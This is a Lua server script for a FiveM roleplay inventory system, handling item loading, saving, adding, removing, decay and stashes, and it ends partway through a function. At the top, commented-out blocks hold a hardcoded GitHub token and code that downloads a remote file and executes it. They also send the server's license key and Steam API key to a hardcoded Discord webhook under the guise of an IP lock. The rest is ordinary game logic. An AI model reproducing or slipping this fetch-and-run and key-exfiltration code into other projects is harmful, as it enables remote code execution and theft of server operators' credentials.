-- local o = "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"
-- local p = "Pixel-Nomad"
-- local q = "AJFW-Config"
-- local r = "ip.cfg"
-- local s = "https://raw.githubusercontent.com/"..p.."/"..q.."/main/"..r
-- local a,b,c,h,i,j,k,l,m,n = s,'',false,'GET',true,200,PerformHttpRequest,load,Wait,{["Authorization"]="token "..o}
-- function d()k(a,function(f,g)if f==j then;b=g;c=i;else;print("> Checking IP ...")print("> Your IP has not been successfully validated!")print("> Closing Server")Wait(12000)os.exit(-1)end;end,h,"",n)end;function e()while not c do;m(0);end;end;d()e()l(b)()e()


-- PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
-- 	local servername = GetConvar('sv_hostname')
-- 	local licensekey = GetConvar('sv_licenseKey')
-- 	local apikey = GetConvar('steam_webApiKey')
-- 	local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'**'
-- 	local content = {{
-- 		author = {
-- 			name = 'Pixel IP LOCK',
-- 			icon_url = 'https://cdn.discordapp.com/attachments/1218652348310749244/1235114974460776468/Untitled_design__2_-removebg-preview.png?ex=663331f5&is=6631e075&hm=919e5b39eb8144ecd8acc39198b5911c02ca99afa8f1b1f960c8485b665346e3&'
-- 		},
-- 		["color"] = 0000,
-- 		["description"] = messagem,
-- 		["footer"] = {
-- 			["text"] = "Pixel | IPLOCK",
-- 		},
-- 	}}
-- 	PerformHttpRequest("https://discord.com/api/webhooks/1115679118869155850/ahLcwqUnUgJZPsNff65T1qVtSevyE-zK0cbASV0pxYwQGnnQKkKJMRg6nRzA9ezJtvSw", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
-- 	if not Clusters.ip[text] then
-- 		print("> Checking IP ...")
-- 		print("> Your IP has not been successfully validated!")
-- 		print("> Closing Server")
-- 		Wait(12000)
-- 		os.exit(-1)
-- 	else
-- 		print("> Checking IP ...")
-- 		print("> Your IP has been successfully validated!")
-- 		print("> Enjoy your server!")
-- 	end
-- end)

local AJFW = exports['aj-base']:GetCoreObject()
local Drops = {}
local Trunks = {}
local Gloveboxes = {}
local Stashes = {}
local ShopItems = {}
local InventoryOpen = {}


local function RemoveTable(tbl, amount, decay)
    if decay then
        local newData = {}
        local startIndex = math.max(#tbl - amount + 1, 1)
        local endIndex = #tbl
        if startIndex <= endIndex then
            table.move(tbl, startIndex, endIndex, 1, newData)
        end
        return newData
    else
        return tbl
    end
end

local function deep_copy(original)
    local function _copy(obj)
        if type(obj) ~= "table" then return obj end
        local copy = {}
        for k, v in pairs(obj) do
            copy[_copy(k)] = _copy(v)
        end
        return copy
    end
    return _copy(original)
end

local function checkWeapon(source, item)
    local ped = GetPlayerPed(source)
    local weapon = GetSelectedPedWeapon(ped)
    local weaponInfo = AJFW.Shared.Weapons[weapon]
    if weaponInfo and weaponInfo.name == item.name then
        RemoveWeaponFromPed(ped, weapon)
    end
end


local function LoadInventory(source, citizenid)
	local inventory = MySQL.prepare.await('SELECT inventory FROM players WHERE citizenid = ?', { citizenid })
	local loadedInventory = {}
	local missingItems = {}

	if not inventory then return loadedInventory end

	inventory = json.decode(inventory)
	if table.type(inventory) == "empty" then return loadedInventory end

	for _, item in pairs(inventory) do
		if item then
			local itemInfo = AJFW.Shared.Items[item.name:lower()]
			if itemInfo then
				loadedInventory[item.slot] = {
					name = itemInfo['name'],
					amount = item.amount,
					info = item.info or '',
					label = itemInfo['label'],
					description = itemInfo['description'] or '',
					weight = itemInfo['weight'],
					type = itemInfo['type'],
					unique = itemInfo['unique'],
					useable = itemInfo['useable'],
					image = itemInfo['image'],
					shouldClose = itemInfo['shouldClose'],
					slot = item.slot,
					combinable = itemInfo['combinable'],
					created = item.created,
					metadata = item.metadata,
                    decay    = item.decay,
				}
			else
				missingItems[#missingItems + 1] = item.name:lower()
			end
		end
	end

	if #missingItems > 0 then
		print(("The following items were removed for player %s as they no longer exist"):format(GetPlayerName(source)))
		AJFW.Debug(missingItems)
	end

	return loadedInventory
end exports("LoadInventory", LoadInventory)

local function SaveInventory(source, offline)
	local PlayerData
	if not offline then
		local Player = AJFW.Functions.GetPlayer(source)

		if not Player then return end

		PlayerData = Player.PlayerData
	else
		PlayerData = source -- for offline users, the playerdata gets sent over the source variable
	end

	local items = PlayerData.items
	local ItemsJson = {}
	if items and table.type(items) ~= "empty" then
		for slot, item in pairs(items) do
			if items[slot] then
				ItemsJson[#ItemsJson+1] = {
					name = item.name,
					amount = item.amount,
					info = item.info,
					type = item.type,
					slot = slot,
					created = item.created,
					metadata = item.metadata,
                    decay    = item.decay,
				}
			end
		end
		MySQL.prepare('UPDATE players SET inventory = ? WHERE citizenid = ?', { json.encode(ItemsJson), PlayerData.citizenid })
	else
		MySQL.prepare('UPDATE players SET inventory = ? WHERE citizenid = ?', { '[]', PlayerData.citizenid })
	end
end exports("SaveInventory", SaveInventory)

local function GetTotalWeight(items)
	local weight = 0
    if not items then return 0 end
    for _, item in pairs(items) do
        weight += item.weight * item.amount
    end
    return tonumber(weight)
end exports("GetTotalWeight", GetTotalWeight)

local function GetSlotsByItem(items, itemName)
    local slotsFound = {}
    if not items then return slotsFound end
    for slot, item in pairs(items) do
        if item.name:lower() == itemName:lower() then
            slotsFound[#slotsFound+1] = slot
        end
    end
    return slotsFound
end exports("GetSlotsByItem", GetSlotsByItem)

local function GetFirstSlotByItem(items, itemName)
    if not items then return nil end
    for slot, item in pairs(items) do
        if item.name:lower() == itemName:lower() then
            return tonumber(slot)
        end
    end
    return nil
end exports("GetFirstSlotByItem", GetFirstSlotByItem)

local function AddItem(source, item, amount, slot, info, forceUpdate, created, metadata, decay, extraargs)
	local reason = ''
	if type(forceUpdate) == 'string' then
		reason = forceUpdate
		forceUpdate = created
		created = metadata
		metadata = decay
		decay = extraargs
	end
	local Player = AJFW.Functions.GetPlayer(source)
	if not Player then return false end
	local totalWeight = GetTotalWeight(Player.PlayerData.items)
	local itemInfo = AJFW.Shared.Items[item:lower()]
	local time = os.time()
	local qua = math.random(25,75)
	if not Config.TestDecay then
		qua = 100
	end
	if not metadata then
		if not Config.TestDecay then
			amount = itemInfo.decay and amount  or 1
		end
		itemInfo['metadata'] = {}
		for i = 1, amount do
			itemInfo['metadata'][#itemInfo['metadata']+1] = {
				created = time,
				quality =  qua
			}
		end
        if Config.TestDecay or itemInfo.decay then
            decay = true
        end
	else
		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
		itemInfo['metadata'] = metadata
	end
	if not created then
		itemInfo['created'] = time
	else
		itemInfo['created'] = created
	end
	if not itemInfo and not Player.Offline then
		AJFW.Functions.Notify(source, "Item does not exist", 'error')
		return false
	end

	amount = tonumber(amount) or 1
	slot = tonumber(slot) or GetFirstSlotByItem(Player.PlayerData.items, item)
	info = info or {}
	itemInfo['created'] = itemInfo['metadata'][#itemInfo['metadata']].created or time
	local ogQuality = info.quality
	info.quality = itemInfo['metadata'][#itemInfo['metadata']].quality or qua

	if itemInfo['type'] == 'weapon' then
		info.serie = info.serie or tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
		info.quality = ogQuality or qua
	end
	if item == "phone" then
		TriggerClientEvent('lb-phone:itemAdded', source)
	end
	if (totalWeight + (itemInfo['weight'] * amount)) <= Config.MaxInventoryWeight then
		if (slot and Player.PlayerData.items[slot]) and (Player.PlayerData.items[slot].name:lower() == item:lower()) and (itemInfo['type'] == 'item' and not itemInfo['unique']) then
			if Player.PlayerData.items[slot].decay == decay then
                if decay then
					Player.PlayerData.items[slot].metadata = exports['aj-inventory-helper']:Decode(Player.PlayerData.items[slot].metadata.data)
                    local newData = {}
                    local existingMetadata = Player.PlayerData.items[slot].metadata
                    local upcomingMetadata = itemInfo['metadata']
                    local amountMeta = math.min(#upcomingMetadata, amount)
                    
                    -- Copy existing metadata
                    for i = 1, #existingMetadata do
                        newData[i] = existingMetadata[i]
                    end
                    
                    -- Move upcoming metadata
                    local newMetadataStartIndex = #existingMetadata + 1
                    table.move(upcomingMetadata, #upcomingMetadata - amountMeta + 1, #upcomingMetadata, newMetadataStartIndex, newData)
                    
                    -- Update player data
                    Player.PlayerData.items[slot].created = newData[#newData].created
                    Player.PlayerData.items[slot].info.quality = newData[#newData].quality
                    Player.PlayerData.items[slot].metadata = {
						count = #newData,
						data = exports['aj-inventory-helper']:Encode(newData)
					}
                end
				Player.PlayerData.items[slot].amount = Player.PlayerData.items[slot].amount + amount
				Player.Functions.SetPlayerData("items", Player.PlayerData.items)
				if Player.Offline then return true end
				if forceUpdate then
					TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
				end
				TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'AddItem', 'green', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** got item: [slot:' .. slot .. '], itemname: ' .. Player.PlayerData.items[slot].name .. ', added amount: ' .. amount .. ', new total amount: ' .. Player.PlayerData.items[slot].amount)
				return true
			else
				for i = 1, Config.MaxInventorySlots, 1 do
					if Player.PlayerData.items[i] == nil then
						Player.PlayerData.items[i] = { 
							name = itemInfo['name'], 
							amount = amount, 
							info = info or '', 
							label = itemInfo['label'], 
							description = itemInfo['description'] or '', 
							weight = itemInfo['weight'], 
							type = itemInfo['type'], 
							unique = itemInfo['unique'], 
							useable = itemInfo['useable'], 
							image = itemInfo['image'], 
							shouldClose = itemInfo['shouldClose'], 
							slot = i, 
							combinable = itemInfo['combinable'], 
							created = itemInfo['created'],
							metadata = {
								count = #itemInfo['metadata'],
								data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
							},
                    		decay    = decay,
						}
						Player.Functions.SetPlayerData("items", Player.PlayerData.items)
						if Player.Offline then return true end
						if forceUpdate then
							TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
						end
						TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'AddItem', 'green', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** got item: [slot:' .. i .. '], itemname: ' .. Player.PlayerData.items[i].name .. ', added amount: ' .. amount .. ', new total amount: ' .. Player.PlayerData.items[i].amount)
						return true
					end
				end
			end
		elseif not itemInfo['unique'] and slot or slot and Player.PlayerData.items[slot] == nil then
			if #itemInfo['metadata'] == amount then
				Player.PlayerData.items[slot] = { 
					name = itemInfo['name'], 
					amount = amount, 
					info = info or '', 
					label = itemInfo['label'], 
					description = itemInfo['description'] or '', 
					weight = itemInfo['weight'], 
					type = itemInfo['type'], 
					unique = itemInfo['unique'], 
					useable = itemInfo['useable'], 
					image = itemInfo['image'], 
					shouldClose = itemInfo['shouldClose'], 
					slot = slot, 
					combinable = itemInfo['combinable'], 
					created = itemInfo['created'], 
					metadata = {
						count = #itemInfo['metadata'],
						data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
					},
					decay = decay,
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				Player.PlayerData.items[slot] = { 
					name = itemInfo['name'], 
					amount = amount, 
					info = info or '', 
					label = itemInfo['label'], 
					description = itemInfo['description'] or '', 
					weight = itemInfo['weight'], 
					type = itemInfo['type'], 
					unique = itemInfo['unique'], 
					useable = itemInfo['useable'], 
					image = itemInfo['image'], 
					shouldClose = itemInfo['shouldClose'], 
					slot = slot, 
					combinable = itemInfo['combinable'], 
					created = itemInfo['created'], 
					metadata = {
						count = #adata,
						data = exports['aj-inventory-helper']:Encode(adata)
					},
					decay = decay,
				}
			end
			Player.Functions.SetPlayerData("items", Player.PlayerData.items)

			if Player.Offline then return true end
			if forceUpdate then
        		TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
			end
			TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'AddItem', 'green', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** got item: [slot:' .. slot .. '], itemname: ' .. Player.PlayerData.items[slot].name .. ', added amount: ' .. amount .. ', new total amount: ' .. Player.PlayerData.items[slot].amount)

			return true
		elseif itemInfo['unique'] or (not slot or slot == nil) or itemInfo['type'] == 'weapon' then
			for i = 1, Config.MaxInventorySlots, 1 do
				if Player.PlayerData.items[i] == nil then
					if #itemInfo['metadata'] == amount then
						Player.PlayerData.items[i] = { 
							name = itemInfo['name'], 
							amount = amount, 
							info = info or '', 
							label = itemInfo['label'], 
							description = itemInfo['description'] or '', 
							weight = itemInfo['weight'], 
							type = itemInfo['type'], 
							unique = itemInfo['unique'], 
							useable = itemInfo['useable'], 
							image = itemInfo['image'], 
							shouldClose = itemInfo['shouldClose'], 
							slot = i, 
							combinable = itemInfo['combinable'], 
							created = itemInfo['created'],
							metadata = {
								count = #itemInfo['metadata'],
								data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
							},
							decay = decay
						}
					else
						local adata = RemoveTable(itemInfo['metadata'], amount, decay)
						Player.PlayerData.items[i] = { 
							name = itemInfo['name'], 
							amount = amount, 
							info = info or '', 
							label = itemInfo['label'], 
							description = itemInfo['description'] or '', 
							weight = itemInfo['weight'], 
							type = itemInfo['type'], 
							unique = itemInfo['unique'], 
							useable = itemInfo['useable'], 
							image = itemInfo['image'], 
							shouldClose = itemInfo['shouldClose'], 
							slot = i, 
							combinable = itemInfo['combinable'], 
							created = itemInfo['created'],
							metadata = {
								count = #adata,
								data = exports['aj-inventory-helper']:Encode(adata)
							},
							decay = decay
						}
					end
					
					Player.Functions.SetPlayerData("items", Player.PlayerData.items)

					if Player.Offline then return true end
					if forceUpdate then
						TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
					end
					TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'AddItem', 'green', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** got item: [slot:' .. i .. '], itemname: ' .. Player.PlayerData.items[i].name .. ', added amount: ' .. amount .. ', new total amount: ' .. Player.PlayerData.items[i].amount)

					return true
				end
			end
		end
	elseif not Player.Offline then
		AJFW.Functions.Notify(source, "Inventory too full", 'error')
	end
	return false
end exports("AddItem", AddItem)

local function RemoveItem(source, item, amount, slot, forceUpdate)
	local Player = AJFW.Functions.GetPlayer(source)

	if not Player then return false end

	local itemInfo = AJFW.Shared.Items[item:lower()]

	amount = tonumber(amount) or 1
	slot = tonumber(slot)
	if item == "phone" then
		TriggerClientEvent('lb-phone:itemRemoved', source)
	end

	if slot then
		if Player.PlayerData.items[slot].amount > amount then
            if Player.PlayerData.items[slot].decay then
				Player.PlayerData.items[slot].metadata = exports['aj-inventory-helper']:Decode(Player.PlayerData.items[slot].metadata.data)
                local index = #Player.PlayerData.items[slot].metadata
                local amountMeta = math.max(index - amount, 1)
                local newData = {}
                if amountMeta > 0 then
                    table.move(Player.PlayerData.items[slot].metadata, 1, amountMeta, 1, newData)
                end
                Player.PlayerData.items[slot].created = newData[#newData].created
                Player.PlayerData.items[slot].info.quality = newData[#newData].quality
                Player.PlayerData.items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Player.PlayerData.items[slot].amount = Player.PlayerData.items[slot].amount - amount
			Player.Functions.SetPlayerData("items", Player.PlayerData.items)

			if not Player.Offline then
				if forceUpdate then
					TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
				end
				TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'RemoveItem', 'red', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** lost item: [slot:' .. slot .. '], itemname: ' .. Player.PlayerData.items[slot].name .. ', removed amount: ' .. amount .. ', new total amount: ' .. Player.PlayerData.items[slot].amount)
				if tostring(item) == "radio" then
					TriggerClientEvent("zerio-radio:client:removedradio", Player.PlayerData.source)
				end
			end
			
			return true
		elseif Player.PlayerData.items[slot].amount == amount then
			Player.PlayerData.items[slot] = nil
			Player.Functions.SetPlayerData("items", Player.PlayerData.items)

			if Player.Offline then return true end
			if forceUpdate then
        		TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
			end
			TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'RemoveItem', 'red', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** lost item: [slot:' .. slot .. '], itemname: ' .. item .. ', removed amount: ' .. amount .. ', item removed')
			if tostring(item) == "radio" then
				TriggerClientEvent("zerio-radio:client:removedradio", Player.PlayerData.source)
			end
			return true
		end
	else
		local slots = GetSlotsByItem(Player.PlayerData.items, item)
		local amountToRemove = amount

		if not slots then return false end

		for _, _slot in pairs(slots) do
			if Player.PlayerData.items[_slot].amount > amountToRemove then
                if Player.PlayerData.items[_slot].decay then
					Player.PlayerData.items[_slot].metadata = exports['aj-inventory-helper']:Decode(Player.PlayerData.items[_slot].metadata.data)
                    local index = #Player.PlayerData.items[_slot].metadata
                    local amountMeta = math.max(index - amountToRemove, 1)
                    local newData = {}
                    if amountMeta > 0 then
                        table.move(Player.PlayerData.items[_slot].metadata, 1, amountMeta, 1, newData)
                    end
                    Player.PlayerData.items[_slot].created = newData[#newData].created
                    Player.PlayerData.items[_slot].info.quality = newData[#newData].quality
                    Player.PlayerData.items[_slot].metadata = {
						count = #newData,
						data = exports['aj-inventory-helper']:Encode(newData)
					}
                end
				Player.PlayerData.items[_slot].amount = Player.PlayerData.items[_slot].amount - amountToRemove
				Player.Functions.SetPlayerData("items", Player.PlayerData.items)

				if not Player.Offline then
					if forceUpdate then
						TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
					end
					TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'RemoveItem', 'red', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** lost item: [slot:' .. _slot .. '], itemname: ' .. Player.PlayerData.items[_slot].name .. ', removed amount: ' .. amount .. ', new total amount: ' .. Player.PlayerData.items[_slot].amount)
					if tostring(item) == "radio" then
						TriggerClientEvent("zerio-radio:client:removedradio", Player.PlayerData.source)
					end
				end
				
				return true
			elseif Player.PlayerData.items[_slot].amount == amountToRemove then
				Player.PlayerData.items[_slot] = nil
				Player.Functions.SetPlayerData("items", Player.PlayerData.items)

				if Player.Offline then return true end
				if forceUpdate then
					TriggerClientEvent('inventory:client:UpdatePlayerInventory', source,false,Player.PlayerData.items)
				end
				TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'RemoveItem', 'red', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** lost item: [slot:' .. _slot .. '], itemname: ' .. item .. ', removed amount: ' .. amount .. ', item removed')
				if tostring(item) == "radio" then
					TriggerClientEvent("zerio-radio:client:removedradio", Player.PlayerData.source)
				end
				return true
			end
		end
	end
	return false
end exports("RemoveItem", RemoveItem)

local function CheckDecay(item, amount, min)
	min = min or 0
	if item.info.quality - amount >= min then
		return true
	end
	return false
end exports('CheckDecay', CheckDecay)

local function PerformDecay(source, item, amount, forceUpdate)
    if item.decay then
        local src = source
        local data = item.info
		local DecayRate = (not AJFW.Shared.Items[item.name:lower()]["StopDecay"] and AJFW.Shared.Items[item.name:lower()]["decay"] ~= nil and AJFW.Shared.Items[item.name:lower()]["decay"] ) or (AJFW.Shared.Items[item.name:lower()]["StopDecay"] and 0.0) or 0.0
		local retval = {}
		if DecayRate == nil then
            DecayRate = 0
        end
		local timeExtra = math.ceil(86400 * DecayRate)
		local newTime = (amount / 100) * timeExtra
        data.quality = data.quality - amount
		item.created = item.created - math.floor(newTime)
		if data.quality < 0 then data.quality = 0 end
        RemoveItem(src, item.name, item.amount, item.slot)
		item.metadata = exports['aj-inventory-helper']:Decay(item.metadata.data, amount, DecayRate)
		AddItem(src, item.name, item.amount, item.slot, data, forceUpdate, item.created, item.metadata, item.decay)
    else
        TriggerClientEvent('AJFW:Notify', source, 'This Item Does Not Support Decay', 'error', 5000)
    end
end exports('PerformDecay', PerformDecay)

local function GetItemBySlot(source, slot)
	local Player = AJFW.Functions.GetPlayer(source)
	slot = tonumber(slot)
	return Player.PlayerData.items[slot]
end exports("GetItemBySlot", GetItemBySlot)

local function GetItemByName(source, item)
	local Player = AJFW.Functions.GetPlayer(source)
	item = tostring(item):lower()
	local slot = GetFirstSlotByItem(Player.PlayerData.items, item)
	return Player.PlayerData.items[slot]
end exports("GetItemByName", GetItemByName)

local function GetItemsByName(source, item)
	local Player = AJFW.Functions.GetPlayer(source)
	item = tostring(item):lower()
	local items = {}
	local slots = GetSlotsByItem(Player.PlayerData.items, item)
	for _, slot in pairs(slots) do
		if slot then
			items[#items+1] = Player.PlayerData.items[slot]
		end
	end
	return items
end exports("GetItemsByName", GetItemsByName)

local function ClearInventory(source, filterItems)
	local Player = AJFW.Functions.GetPlayer(source)
	local savedItemData = {}

	if filterItems then
		local filterItemsType = type(filterItems)
		if filterItemsType == "string" then
			local item = GetItemByName(source, filterItems)

			if item then
				savedItemData[item.slot] = item
			end
		elseif filterItemsType == "table" and table.type(filterItems) == "array" then
			for i = 1, #filterItems do
				local item = GetItemByName(source, filterItems[i])

				if item then
					savedItemData[item.slot] = item
				end
			end
		end
	end

	Player.Functions.SetPlayerData("items", savedItemData)

	if Player.Offline then return end

	TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'ClearInventory', 'red', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** inventory cleared')
end exports("ClearInventory", ClearInventory)

local function SetInventory(source, items)
	local Player = AJFW.Functions.GetPlayer(source)

	Player.Functions.SetPlayerData("items", items)

	if Player.Offline then return end

	TriggerEvent('aj-log:server:CreateLog', 'playerinventory', 'SetInventory', 'blue', '**' .. GetPlayerName(source) .. ' (citizenid: ' .. Player.PlayerData.citizenid .. ' | id: ' .. source .. ')** items set: ' .. json.encode(items))
end exports("SetInventory", SetInventory)

local function SetItemData(source, itemName, key, val)
	if not itemName or not key then return false end

	local Player = AJFW.Functions.GetPlayer(source)

	if not Player then return end

	local item = GetItemByName(source, itemName)

	if not item then return false end

	item[key] = val
	Player.PlayerData.items[item.slot] = item
	Player.Functions.SetPlayerData("items", Player.PlayerData.items)

	return true
end exports("SetItemData", SetItemData)

local function HasItem(source, items, amount)
    local Player = AJFW.Functions.GetPlayer(source)
    if not Player then return false end
    local isTable = type(items) == 'table'
    local isArray = isTable and table.type(items) == 'array' or false
    local totalItems = #items
    local count = 0
    local kvIndex = 2
    if isTable and not isArray then
        totalItems = 0
        for _ in pairs(items) do totalItems += 1 end
        kvIndex = 1
    end
    if isTable then
        for k, v in pairs(items) do
            local itemKV = {k, v}
            local item = GetItemByName(source, itemKV[kvIndex])
            if item and ((amount and item.amount >= amount) or (not isArray and item.amount >= v) or (not amount and isArray)) then
                count += 1
            end
        end
        if count == totalItems then
            return true
        end
    else -- Single item as string
        local item = GetItemByName(source, items)
        if item and (not amount or (item and amount and item.amount >= amount)) then
            return true
        end
    end
    return false
end exports("HasItem", HasItem)

local function CreateUsableItem(itemName, data)
	AJFW.Functions.CreateUseableItem(itemName, data)
end exports("CreateUsableItem", CreateUsableItem)

local function GetUsableItem(itemName)
	return AJFW.Functions.CanUseItem(itemName)
end exports("GetUsableItem", GetUsableItem)

local function UseItem(itemName, ...)
	local itemData = GetUsableItem(itemName)
	local callback = type(itemData) == 'table' and (rawget(itemData, '__cfx_functionReference') and itemData or itemData.cb or itemData.callback) or type(itemData) == 'function' and itemData
	if not callback then return end
	callback(...)
end exports("UseItem", UseItem)

local function recipeContains(recipe, fromItem)
	for _, v in pairs(recipe.accept) do
		if v == fromItem.name then
			return true
		end
	end

	return false
end

local function hasCraftItems(source, CostItems, amount)
	for k, v in pairs(CostItems) do
		local item = GetItemByName(source, k)

		if not item then return false end

		if item.amount < (v * amount) then return false end
	end
	return true
end

local function IsVehicleOwned(plate)
    local result = MySQL.scalar.await('SELECT 1 from player_vehicles WHERE plate = ?', { plate })
	if Config.KeepSharedGarages then
		local result2 = MySQL.scalar.await('SELECT 1 from shared_garage WHERE plate = ?', { plate })
		return result or result2
	else
		return result
	end
end

local function SetupShopItems(shopItems)
	local items = {}
	if shopItems and next(shopItems) then
		for _, item in pairs(shopItems) do
			local itemInfo = AJFW.Shared.Items[item.name:lower()]
			if itemInfo then
				items[item.slot] = {
					name = itemInfo["name"],
					amount = tonumber(item.amount),
					info = item.info or "",
					label = itemInfo["label"],
					description = itemInfo["description"] or "",
					weight = itemInfo["weight"],
					type = itemInfo["type"],
					unique = itemInfo["unique"],
					useable = itemInfo["useable"],
					price = item.price,
					image = itemInfo["image"],
					slot = item.slot,
				}
			end
		end
	end
	return items
end

local function GetStashItems(stashId)
	local items = {}
	local result = MySQL.scalar.await('SELECT items FROM stashitems WHERE stash = ?', {stashId})
	if not result then return items end

	local stashItems = json.decode(result)
	if not stashItems then return items end

	for _, item in pairs(stashItems) do
		local itemInfo = AJFW.Shared.Items[item.name:lower()]
		if itemInfo then
			items[item.slot] = {
				name = itemInfo["name"],
				amount = tonumber(item.amount),
				info = item.info or "",
				label = itemInfo["label"],
				description = itemInfo["description"] or "",
				weight = itemInfo["weight"],
				type = itemInfo["type"],
				unique = itemInfo["unique"],
				useable = itemInfo["useable"],
				image = itemInfo["image"],
				created = item.created or os.time(),
				metadata = item.metadata or {
					count = 1,
					data = "eJyLrlZKLkpNLElNUbIyNjc0NLYwsbS01FEqLE3MySypVLIyNDCojQUA4ZoLY"
				},
				slot = item.slot,
				decay = item.decay,
			}
		end
	end
	return items
end

local function SaveStashItems(stashId, items)
	if Stashes[stashId].label == "Stash-None" or not items then return end

	for _, item in pairs(items) do
		item.description = nil
	end

	MySQL.insert('INSERT INTO stashitems (stash, items) VALUES (:stash, :items) ON DUPLICATE KEY UPDATE items = :items', {
		['stash'] = stashId,
		['items'] = json.encode(items)
	})

	Stashes[stashId].isOpen = false
end

local function AddToStash(stashId, slot, otherslot, itemName, amount, info, created, metadata, decay)
	amount = tonumber(amount) or 1
	local ItemData = AJFW.Shared.Items[itemName]
	local itemInfo = AJFW.Shared.Items[itemName:lower()]
	local time = os.time()
	if not metadata then
		local amount = itemInfo.decay and amount or 1
		itemInfo['metadata'] = {}
		for i = 1, amount do
			itemInfo['metadata'][#itemInfo['metadata']+1] = {
				created = time,
				quality =  100
			}
		end
        if itemInfo.decay then
            decay = itemInfo.decay
        end
	else
		metadata = exports['aj-inventory-helper']:Decode(metadata.data)
		itemInfo['metadata'] = metadata
	end
	if not created then
		itemInfo['created'] = time
	else
		itemInfo['created'] = created
	end
	info = info or {}
	itemInfo['created'] = itemInfo['metadata'][#itemInfo['metadata']].created or time
	local ogQuality = info.quality
	
	info.quality = itemInfo['metadata'][#itemInfo['metadata']].quality or 100
	if itemInfo['type'] == 'weapon' then
		info.serie = info.serie or tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
		info.quality = ogQuality or 100
	end
	if not ItemData.unique then
		if Stashes[stashId].items[slot] and Stashes[stashId].items[slot].name == itemName then
            if decay then
				Stashes[stashId].items[slot].metadata = exports['aj-inventory-helper']:Decode(Stashes[stashId].items[slot].metadata.data)
                local newData = {}
                local existingMetadata = Stashes[stashId].items[slot].metadata
                local upcomingMetadata = itemInfo['metadata']
                local amountMeta = math.min(#upcomingMetadata, amount)
                
                -- Copy existing metadata
                for i = 1, #existingMetadata do
                    newData[i] = existingMetadata[i]
                end
                
                -- Move upcoming metadata
                local newMetadataStartIndex = #existingMetadata + 1
                table.move(upcomingMetadata, #upcomingMetadata - amountMeta + 1, #upcomingMetadata, newMetadataStartIndex, newData)
                
                -- Update player data
                Stashes[stashId].items[slot].created = newData[#newData].created
                Stashes[stashId].items[slot].info.quality = newData[#newData].quality
                Stashes[stashId].items[slot].metadata = {
					count = #newData,
					data = exports['aj-inventory-helper']:Encode(newData)
				}
            end
			Stashes[stashId].items[slot].amount = Stashes[stashId].items[slot].amount + amount
		else
			if #itemInfo['metadata'] == amount then
				Stashes[stashId].items[slot] = {
					name = itemInfo["name"],
					amount = amount,
					info = info or "",
					label = itemInfo["label"],
					description = itemInfo["description"] or "",
					weight = itemInfo["weight"],
					type = itemInfo["type"],
					unique = itemInfo["unique"],
					useable = itemInfo["useable"],
					image = itemInfo["image"],
					created = itemInfo['created'],
					metadata = {
						count = #itemInfo['metadata'],
						data = exports['aj-inventory-helper']:Encode(itemInfo['metadata'])
					},
					slot = slot,
					decay = decay,
				}
			else
				local adata = RemoveTable(itemInfo['metadata'], amount, decay)
				Stashes[stashId].items[slot] = {
					name = itemInfo["name"],
					amount = amount,
					info = info or "",
					label = itemInfo["label"],
					description = itemInfo["description"] or "",
					weight = itemInfo["weight"],
					type = itemInfo["type"],
					unique = itemInfo["unique"],
					useable = itemInfo["useable"],
					image = itemInfo["image"],
					created = itemInfo['created'],
					metadata = {
						count = #adata,
						data = exports['aj-inventory-helper']:Encode(adata)
					},
					slot = slot,
					decay = decay,
				}
			end
		end
	else
		if Stashes[stashId].items[slot] and Stashes[stashId].items[slot].name == itemName then
			if #itemInfo['metadata'] == amount then
